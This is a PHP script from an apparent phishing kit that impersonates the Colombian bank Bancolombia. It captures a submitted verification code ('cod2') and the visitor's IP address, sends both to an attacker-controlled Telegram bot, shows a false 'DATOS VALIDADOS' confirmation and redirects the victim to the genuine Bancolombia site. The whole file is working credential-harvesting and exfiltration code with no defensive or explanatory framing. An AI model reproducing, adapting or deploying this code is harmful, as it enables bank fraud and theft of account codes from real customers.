<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
include('datos.php');

if( isset( $_POST['cod2'] ) ){

$message = ":::BanColombiaV3:::\r\nCod-2.: ".$_POST['cod2']."\r\nIP: ".$userp."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
echo '<script language="javascript">alert("DATOS VALIDADOS\r\nMuchas gracias por confiar en nuestros servicios, sus datos fueron validados exitosamente.");</script>';
echo '<script type="text/javascript">window.location.href = "https://www.bancolombia.com/personas";</script>';}
////////////////////
?>
